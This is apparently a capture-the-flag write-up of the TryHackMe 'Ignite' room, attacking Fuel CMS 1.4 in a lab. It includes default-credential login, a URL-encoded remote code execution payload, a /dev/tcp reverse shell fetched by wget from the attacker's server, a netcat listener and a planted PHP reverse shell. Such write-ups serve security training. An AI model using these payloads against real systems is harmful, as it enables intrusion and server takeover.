[Ignite](https://tryhackme.com/room/ignite)

I'll start off with an nmap scan using `-sC` for default scripts `-sV` enumerate version, and `-v` to list ports as they're discovered. I also do an all ports scan with to see if there's anything on less common ports. Nmap just returns port 80 open, which has a site for "Fuel CMS v1.4"
```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-title: Welcome to FUEL CMS
```
Nmap shows that there's a `/robots.txt` file, which has one entry, `/fuel`. That directory brings me a login page. Taking a look back at the main page, down near the bottom there's a line that says
```To access the FUEL admin, go to:
http://10.10.100.60/fuel
User name: admin
Password: admin (you can and should change this password and admin user information after logging in)
```
Let's see if they changed it... nope! That gets me right in to the admin panel.
I'm prompted to change the admin password, and while tempting, it would be rather noisy to lock the real admin out of their account. So i opt to leave the password as it is and hope I can get persistance some other way.

Taking a quick look at searchsploit for Fuel CMS 1.4 returns an RCE vulnerability. Taking a look at an exploit script, it looks very simple, you can execute code simply by browsing to : `http://$IP/fuel/pages/select/?filter=/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{COMMAND}%27%29%2b%27` I give this a try, and it works!!

![Fuel-RCE](https://user-images.githubusercontent.com/112681383/205481986-902eff53-6632-41ef-9be4-8fd90833cb25.png)

I try to send a few different rev shells with the RCE but they don't seem to work. Since curl isn't installed, I write a rev shell and host it on a server in my attacking machine, then download and execute it with the RCE
```bash
echo '/bin/bash -c "bash -c >& /dev/tcp/10.13.8.139/9001 0>&1"' > shell.sh # Attacker : write rev shell script
python3 -m http.server 80 # Attacker : start http server
wget http://10.13.8.139/shell.sh # Victim RCE : download rev shell
nc -lvnp 9001 # Attacker : start netcat listener
bash shell.sh # Victim RCE : execute reverse shell
```
And just like that, I've got a reverse shell on the box.

![RCE-to-revshell](https://user-images.githubusercontent.com/112681383/205482555-6468f926-2073-4bb3-a5e1-83ce6fb3719a.png)

Interestingly, the RCE seems to execute whatever code I give it many times over.

The first thing that jumps out at me is that the whole website is owned by root, but has read, write, and execute permissions for everyone. I first overwrite a php file with the [PentestMonkey] php reverse shell and then go to that page in my browser. Sure enough, it sends me a reverse shell, but as www-data.
